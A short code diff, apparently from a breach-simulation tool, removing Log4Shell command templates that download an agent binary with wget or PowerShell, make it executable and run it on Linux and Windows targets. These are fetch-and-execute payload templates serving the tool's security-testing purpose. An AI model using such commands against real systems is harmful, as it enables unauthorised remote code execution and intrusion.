@@ -24,17 +24,4 @@ RUN_MONKEY = "%(monkey_path)s %(monkey_type)s %(parameters)s"
 # Commands used to check for architecture and if machine is exploitable
 CHECK_COMMAND = "echo %s" % ID_STRING
 
-LOG4SHELL_LINUX_COMMAND = (
-    "wget -O %(monkey_path)s %(http_path)s ;"
-    "chmod +x %(monkey_path)s ;"
-    " %(agent_otp_environment_variable)s=%(agent_otp)s "
-    " %(monkey_path)s %(monkey_type)s %(parameters)s"
-)
-
-LOG4SHELL_WINDOWS_COMMAND = (
-    'powershell -NoLogo -Command "'
-    "Invoke-WebRequest -Uri '%(http_path)s' -OutFile '%(monkey_path)s' -UseBasicParsing; "
-    "$env:%(agent_otp_environment_variable)s='%(agent_otp)s' ; "
-    '%(monkey_path)s %(monkey_type)s %(parameters)s"'
-)
 DOWNLOAD_TIMEOUT = 180
